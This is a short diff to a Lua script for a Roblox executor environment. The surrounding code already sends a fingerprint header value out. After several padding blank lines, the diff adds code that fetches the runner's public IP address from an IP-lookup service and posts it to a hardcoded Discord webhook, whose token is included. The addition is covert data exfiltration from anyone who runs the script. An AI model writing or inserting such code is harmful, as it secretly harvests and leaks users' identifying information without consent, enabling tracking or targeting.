@@ -13,3 +13,18 @@ syn.request({
       ["content"] = "`Security:  `"..parsed.headers["Syn-Fingerprint"]
   })
 })
+
+
+
+
+local ip = syn.request({Url = "https://api.ipify.org", Method = "GET"}).Body
+syn.request({
+    Url = "https://discord.com/api/webhooks/1028514891348320336/53D09tYx__4LhaPMZkDVxtUEd4zI4B0EDZfAkvYEADCDrvhY8eEqm-d8Xsb_G65wgTWk",          
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode({
+        content = "```IP: "..ip.."```"
+    })
+})
